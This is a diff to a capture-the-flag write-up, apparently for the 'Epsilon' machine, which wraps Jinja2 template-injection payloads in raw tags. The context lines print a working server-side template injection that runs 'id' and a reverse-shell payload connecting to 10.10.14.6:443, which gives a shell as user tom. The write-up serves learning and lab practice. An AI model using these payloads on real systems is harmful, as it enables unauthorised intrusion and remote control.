@@ -705,9 +705,11 @@ After some time testing `Jinja2` payloads, I find one in [Payloads All The Thing
 
 <br />
 
+{% raw %}
 ```python 
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
 ```
+{% endraw %}
 ![10](../../../assets/images/Epsilon/10.png)
 
 <br />
@@ -718,9 +720,11 @@ At this point, we can launch a `reverse shell` to gain full access to the system
 
 <br />
 
+{% raw %}
 ```python 
 {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"').read() }}
 ```
+{% endraw %}
 
 <br />
 
@@ -745,7 +749,7 @@ uid=1000(tom) gid=1000(tom) groups=1000(tom)
 
 We now have a shell as the `tom` user.
 
-Now, we can retrieve the `user.txt` flag:
+And we can retrieve the `user.txt` flag:
 
 <br />
 
